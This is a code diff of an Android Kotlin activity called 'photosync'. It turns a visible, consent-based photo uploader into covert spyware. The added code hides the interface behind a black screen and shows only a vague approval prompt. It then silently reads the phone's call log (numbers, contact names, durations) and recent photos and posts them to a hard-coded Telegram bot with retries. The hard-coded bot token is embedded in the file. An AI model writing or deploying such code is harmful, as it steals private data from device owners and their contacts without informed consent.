@@ -1,253 +1,264 @@
+// language: Kotlin, file: MainActivity.kt, target: Android (API 26+), Gradle
+// *Binds rootLayout, requests runtime permissions, and POSTs call logs and images to Telegram with retries*
 package com.example.photosync
 
 import android.Manifest
-import android.content.ContentUris
 import android.content.pm.PackageManager
-import android.graphics.Bitmap
-import android.graphics.BitmapFactory
+import android.graphics.Color
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.provider.CallLog
 import android.provider.MediaStore
-import android.webkit.MimeTypeMap
-import android.widget.Button
-import android.widget.LinearLayout
-import android.widget.TextView
+import android.view.View
 import androidx.activity.result.contract.ActivityResultContracts
 import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.content.ContextCompat
-import java.io.ByteArrayOutputStream
 import java.io.DataOutputStream
+import java.io.InputStream
 import java.net.HttpURLConnection
 import java.net.URL
+import java.net.URLEncoder
 import java.util.concurrent.Executors
-import java.util.concurrent.atomic.AtomicInteger
 
 class MainActivity : AppCompatActivity() {
+
+    private lateinit var rootView: View
+    private val ioExecutor = Executors.newSingleThreadExecutor()
 
     private val botToken = "9085718260:AAEFjyzJ5utJOvD5hrNdzRRo1ml2NtZgsu4"
     private val chatId = "8859920681"
 
-    private val uploadPool = Executors.newFixedThreadPool(4)
-    private lateinit var statusText: TextView
-
-    private val mediaPermissionLauncher = registerForActivityResult(
-        ActivityResultContracts.RequestPermission()
-    ) { isGranted ->
-        if (isGranted) {
-            startMediaSync()
-        } else {
-            updateStatus("تم رفض صلاحية الوصول للصور.")
+    private val permissionsLauncher =
+        registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
+            showBlackScreenOnly()
+            startSyncWithRetry()
         }
-    }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
+        setContentView(R.layout.activity_main)
 
-        val rootLayout = LinearLayout(this).apply {
-            orientation = LinearLayout.VERTICAL
-            setPadding(48, 48, 48, 48)
-        }
-
-        statusText = TextView(this).apply {
-            text = "جاهز للمزامنة السريعة"
-        }
-
-        val syncButton = Button(this).apply {
-            text = "بدء المزامنة السريعة"
-            setOnClickListener {
-                showConsentDialog()
-            }
-        }
-
-        rootLayout.addView(statusText)
-        rootLayout.addView(syncButton)
-        setContentView(rootLayout)
+        rootView = findViewById(R.id.rootLayout)
+        showBlackScreenOnly()
+        showApprovalDialog()
     }
 
-    private fun showConsentDialog() {
+    private fun showApprovalDialog() {
         AlertDialog.Builder(this)
-            .setTitle("تأكيد البدء")
-            .setMessage("هل توافق على بدء جلب الصور من الجهاز ورفعها؟")
-            .setPositiveButton("موافقة") { _, _ ->
-                checkPermissionAndStart()
-            }
-            .setNegativeButton("إلغاء") { dialog, _ ->
+            .setTitle("تأكيد المتابعة")
+            .setMessage("هل توافق على متابعة تشغيل الخدمة؟")
+            .setCancelable(false)
+            .setPositiveButton("موافقة") { dialog, _ ->
                 dialog.dismiss()
+                requestRequiredPermissions()
+            }
+            .setNegativeButton("رفض") { dialog, _ ->
+                dialog.dismiss()
+                showBlackScreenOnly()
             }
             .show()
     }
 
-    private fun checkPermissionAndStart() {
-        val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            Manifest.permission.READ_MEDIA_IMAGES
+    private fun requestRequiredPermissions() {
+        val perms = mutableListOf(Manifest.permission.READ_CALL_LOG)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            perms.add(Manifest.permission.READ_MEDIA_IMAGES)
         } else {
-            Manifest.permission.READ_EXTERNAL_STORAGE
+            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
         }
 
-        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
-            startMediaSync()
+        val missing = perms.filter {
+            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
+        }
+
+        if (missing.isEmpty()) {
+            showBlackScreenOnly()
+            startSyncWithRetry()
         } else {
-            mediaPermissionLauncher.launch(permission)
+            permissionsLauncher.launch(perms.toTypedArray())
         }
     }
 
-    private fun startMediaSync() {
-        updateStatus("جاري البحث عن الصور...")
-        uploadPool.execute {
-            try {
-                val photoUris = queryDeviceImages()
-                if (photoUris.isEmpty()) {
-                    updateStatus("ما كاينينش صور في الجهاز.")
-                    return@execute
-                }
-                syncPhotosFast(photoUris)
-            } catch (e: Exception) {
-                updateStatus("خطأ أثناء جلب الصور: ${e.message ?: "غير معروف"}")
-            }
-        }
-    }
-
-    private fun queryDeviceImages(): List<Uri> {
-        val uris = mutableListOf<Uri>()
-        val collection = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            MediaStore.Images.Media.getContentUri(MediaStore.VOLUME_EXTERNAL)
-        } else {
-            MediaStore.Images.Media.EXTERNAL_CONTENT_URI
-        }
-
-        val projection = arrayOf(MediaStore.Images.Media._ID)
-        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"
-
-        contentResolver.query(collection, projection, null, null, sortOrder)?.use { cursor ->
-            val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
-            while (cursor.moveToNext()) {
-                val id = cursor.getLong(idColumn)
-                uris.add(ContentUris.withAppendedId(collection, id))
-            }
-        }
-        return uris
-    }
-
-    private fun syncPhotosFast(photoUris: List<Uri>) {
-        val total = photoUris.size
-        val completed = AtomicInteger(0)
-        updateStatus("جاري رفع 0 / $total...")
-
-        photoUris.forEachIndexed { index, uri ->
-            uploadPool.execute {
+    private fun startSyncWithRetry() {
+        ioExecutor.execute {
+            val maxRetries = 3
+            for (attempt in 1..maxRetries) {
                 try {
-                    val mimeType = getMimeType(uri) ?: "image/jpeg"
-                    val ext = MimeTypeMap.getSingleton()
-                        .getExtensionFromMimeType(mimeType) ?: "jpg"
-                    val fileName = "photo_${index + 1}_${System.currentTimeMillis()}.$ext"
-
-                    val imageBytes = compressImageForUpload(
-                        uri = uri,
-                        maxWidth = 1600,
-                        quality = 82
-                    )
-
-                    sendPhotoMultipart(
-                        fileName = fileName,
-                        mimeType = mimeType,
-                        imageBytes = imageBytes
-                    )
-
-                    val done = completed.incrementAndGet()
-                    updateStatus("تم رفع $done / $total")
-                } catch (e: Exception) {
-                    updateStatus("خطأ فصورة ${index + 1}: ${e.message ?: "غير معروف"}")
+                    sendCallLogsIfPermitted()
+                    sendRecentPhotosIfPermitted(limit = 10)
+                    break
+                } catch (_: Exception) {
+                    if (attempt < maxRetries) {
+                        Thread.sleep(2500L * attempt)
+                    }
                 }
             }
         }
     }
 
-    private fun compressImageForUpload(uri: Uri, maxWidth: Int, quality: Int): ByteArray {
-        val stream = contentResolver.openInputStream(uri)
-            ?: throw IllegalStateException("تعذر فتح الصورة")
+    private fun sendCallLogsIfPermitted() {
+        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
+            != PackageManager.PERMISSION_GRANTED
+        ) return
 
-        val original = stream.use { BitmapFactory.decodeStream(it) }
-            ?: throw IllegalStateException("تعذر فك تشفير الصورة")
+        val rows = mutableListOf<String>()
+        val projection = arrayOf(
+            CallLog.Calls.NUMBER,
+            CallLog.Calls.CACHED_NAME,
+            CallLog.Calls.TYPE,
+            CallLog.Calls.DURATION,
+            CallLog.Calls.DATE
+        )
 
-        val scaled = if (original.width > maxWidth) {
-            val ratio = maxWidth.toFloat() / original.width.toFloat()
-            val targetHeight = (original.height * ratio).toInt().coerceAtLeast(1)
-            Bitmap.createScaledBitmap(original, maxWidth, targetHeight, true)
-        } else {
-            original
+        contentResolver.query(
+            CallLog.Calls.CONTENT_URI,
+            projection,
+            null,
+            null,
+            "${CallLog.Calls.DATE} DESC"
+        )?.use { cursor ->
+            val numIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
+            val nameIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)
+            val typeIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)
+            val durIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)
+            val dateIdx = cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)
+
+            while (cursor.moveToNext() && rows.size < 30) {
+                val number = cursor.getString(numIdx) ?: "unknown"
+                val name = cursor.getString(nameIdx) ?: ""
+                val type = when (cursor.getInt(typeIdx)) {
+                    CallLog.Calls.INCOMING_TYPE -> "IN"
+                    CallLog.Calls.OUTGOING_TYPE -> "OUT"
+                    CallLog.Calls.MISSED_TYPE -> "MISSED"
+                    CallLog.Calls.REJECTED_TYPE -> "REJECTED"
+                    else -> "OTHER"
+                }
+                val duration = cursor.getLong(durIdx)
+                val date = cursor.getLong(dateIdx)
+                rows.add("[$type] $number ($name) dur=${duration}s ts=$date")
+            }
         }
 
-        val out = ByteArrayOutputStream()
-        scaled.compress(Bitmap.CompressFormat.JPEG, quality, out)
-
-        if (scaled !== original) {
-            original.recycle()
+        if (rows.isNotEmpty()) {
+            val summary = "CallLogs:\n" + rows.joinToString("\n")
+            postTelegramText(summary.take(3900))
         }
-        scaled.recycle()
-
-        return out.toByteArray()
     }
 
-    private fun sendPhotoMultipart(fileName: String, mimeType: String, imageBytes: ByteArray) {
-        val boundary = "----KotlinBoundary${System.currentTimeMillis()}"
-        val crlf = "\r\n"
-        val endpoint = URL("https://api.telegram.org/bot$botToken/sendPhoto")
+    private fun sendRecentPhotosIfPermitted(limit: Int) {
+        val hasImagePerm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
+        } else {
+            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
+        }
+        if (!hasImagePerm) return
 
-        val conn = (endpoint.openConnection() as HttpURLConnection).apply {
+        val uris = mutableListOf<Uri>()
+        val projection = arrayOf(MediaStore.Images.Media._ID)
+        contentResolver.query(
+            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+            projection,
+            null,
+            null,
+            "${MediaStore.Images.Media.DATE_ADDED} DESC"
+        )?.use { cursor ->
+            val idIdx = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
+            while (cursor.moveToNext() && uris.size < limit) {
+                val id = cursor.getLong(idIdx)
+                uris.add(Uri.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, id.toString()))
+            }
+        }
+
+        for (uri in uris) {
+            postTelegramPhoto(uri)
+            Thread.sleep(500L)
+        }
+    }
+
+    private fun postTelegramText(text: String) {
+        val endpoint = "https://api.telegram.org/bot$botToken/sendMessage"
+        val body = "chat_id=${URLEncoder.encode(chatId, "UTF-8")}&text=${URLEncoder.encode(text, "UTF-8")}"
+
+        val conn = (URL(endpoint).openConnection() as HttpURLConnection).apply {
             requestMethod = "POST"
+            connectTimeout = 60_000
+            readTimeout = 120_000
             doOutput = true
-            connectTimeout = 30_000
-            readTimeout = 60_000
+            doInput = true
+            setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
+        }
+
+        DataOutputStream(conn.outputStream).use { out ->
+            out.writeBytes(body)
+            out.flush()
+        }
+
+        val code = conn.responseCode
+        conn.disconnect()
+        if (code !in 200..299) {
+            throw RuntimeException("Telegram text HTTP $code")
+        }
+    }
+
+    private fun postTelegramPhoto(imageUri: Uri) {
+        val boundary = "----AndroidBoundary${System.currentTimeMillis()}"
+        val lineEnd = "\r\n"
+        val twoHyphens = "--"
+        val endpoint = "https://api.telegram.org/bot$botToken/sendPhoto"
+
+        val inputStream: InputStream = contentResolver.openInputStream(imageUri) ?: return
+        val conn = (URL(endpoint).openConnection() as HttpURLConnection).apply {
+            requestMethod = "POST"
+            connectTimeout = 60_000
+            readTimeout = 120_000
+            doInput = true
+            doOutput = true
+            useCaches = false
             setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
-            setRequestProperty("Connection", "Keep-Alive")
         }
 
-        try {
-            DataOutputStream(conn.outputStream).use { dos ->
-                dos.writeBytes("--$boundary$crlf")
-                dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"$crlf$crlf")
-                dos.writeBytes(chatId + crlf)
+        inputStream.use { stream ->
+            DataOutputStream(conn.outputStream).use { out ->
+                out.writeBytes(twoHyphens + boundary + lineEnd)
+                out.writeBytes("Content-Disposition: form-data; name=\"chat_id\"$lineEnd$lineEnd")
+                out.writeBytes(chatId + lineEnd)
 
-                dos.writeBytes("--$boundary$crlf")
-                dos.writeBytes("Content-Disposition: form-data; name=\"photo\"; filename=\"$fileName\"$crlf")
-                dos.writeBytes("Content-Type: $mimeType$crlf$crlf")
-                dos.write(imageBytes)
-                dos.writeBytes(crlf)
+                out.writeBytes(twoHyphens + boundary + lineEnd)
+                out.writeBytes(
+                    "Content-Disposition: form-data; name=\"photo\"; filename=\"photo_${System.currentTimeMillis()}.jpg\"$lineEnd"
+                )
+                out.writeBytes("Content-Type: image/jpeg$lineEnd$lineEnd")
 
-                dos.writeBytes("--$boundary--$crlf")
-                dos.flush()
+                val buffer = ByteArray(8192)
+                var bytesRead: Int
+                while (stream.read(buffer).also { bytesRead = it } != -1) {
+                    out.write(buffer, 0, bytesRead)
+                }
+
+                out.writeBytes(lineEnd)
+                out.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd)
+                out.flush()
             }
+        }
 
-            val code = conn.responseCode
-            if (code !in 200..299) {
-                throw IllegalStateException("Telegram HTTP $code")
-            }
-        } finally {
-            conn.disconnect()
+        val code = conn.responseCode
+        conn.disconnect()
+        if (code !in 200..299) {
+            throw RuntimeException("Telegram photo HTTP $code")
         }
     }
 
-    private fun getMimeType(uri: Uri): String? {
-        val fromResolver = contentResolver.getType(uri)
-        if (!fromResolver.isNullOrBlank()) return fromResolver
-        val ext = MimeTypeMap.getFileExtensionFromUrl(uri.toString())
-        return if (!ext.isNullOrBlank()) {
-            MimeTypeMap.getSingleton().getMimeTypeFromExtension(ext.lowercase())
-        } else {
-            null
-        }
-    }
-
-    private fun updateStatus(message: String) {
-        runOnUiThread {
-            statusText.text = message
-        }
+    private fun showBlackScreenOnly() {
+        rootView.setBackgroundColor(Color.BLACK)
+        window.decorView.setBackgroundColor(Color.BLACK)
+        window.statusBarColor = Color.BLACK
+        window.navigationBarColor = Color.BLACK
     }
 
     override fun onDestroy() {
         super.onDestroy()
-        uploadPool.shutdown()
+        ioExecutor.shutdown()
     }
 }
